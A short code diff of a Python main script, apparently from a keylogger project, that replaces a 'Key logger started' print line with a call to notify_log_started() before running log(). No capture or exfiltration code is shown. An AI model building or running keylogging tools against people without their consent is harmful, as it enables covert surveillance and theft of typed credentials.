@@ -1,6 +1,5 @@
-from logger_util.logger import log
-from utils.time_util import now
+from logger_util.logger import log, notify_log_started
 
 if __name__ == '__main__':
-    print("Key logger started at " + str(now()))
+    notify_log_started()
     log()
